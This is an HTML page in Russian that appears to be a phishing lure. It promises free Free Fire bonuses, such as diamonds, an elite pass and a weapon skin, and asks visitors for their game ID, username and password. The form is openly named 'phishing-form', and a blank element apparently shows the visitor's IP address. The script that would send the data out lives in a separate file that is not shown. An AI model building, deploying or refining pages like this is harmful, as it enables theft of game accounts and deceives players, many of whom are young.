<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 Free Fire Бонусы 🎮</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="container" style="background: rgba(0, 0, 0, 0.85); box-shadow: 0 5px 15px rgba(0, 0, 0, 0.6);">
        <h1 style="font-family: 'Impact', sans-serif; color: #ff4b4b;">🔥 Получите бонусы для Free Fire! 🎮</h1>
        <p style="font-size: 16px; color: white;">Выберите желаемый бонус и заполните данные для получения награды! 🚀</p>
        <form id="phishing-form">
            <div class="bonus-options">
                <div class="bonus-option" data-value="1000 Diamonds" style="background: linear-gradient(135deg, #ff7f50, #ff4500);">💎 1000 Diamonds</div>
                <div class="bonus-option" data-value="Элитный Пропуск" style="background: linear-gradient(135deg, #ffa500, #ff6347);">🎫 Элитный Пропуск</div>
                <div class="bonus-option" data-value="Редкий Скин Оружия" style="background: linear-gradient(135deg, #ff1493, #ff69b4);">🔫 Редкий Скин Оружия</div>
            </div>
            <input type="text" id="profile-link" placeholder="🔗 Введите ID Free Fire" required style="background-color: rgba(255, 255, 255, 0.1); color: white;">
            <input type="text" id="username" placeholder="👤 Введите имя пользователя Free Fire" required style="background-color: rgba(255, 255, 255, 0.1); color: white;">
            <input type="password" id="password" placeholder="🔒 Введите пароль Free Fire" required style="background-color: rgba(255, 255, 255, 0.1); color: white;">
            <button type="submit" id="get-bonus-btn" style="background: linear-gradient(135deg, #ff7f50, #ff4500); color: white;">🔥 Получить бонус 🔥</button>
        </form>
        <p id="ip-display" style="margin-top: 10px; color: red; font-weight: bold;"></p>
    </div>
</body>
</html>
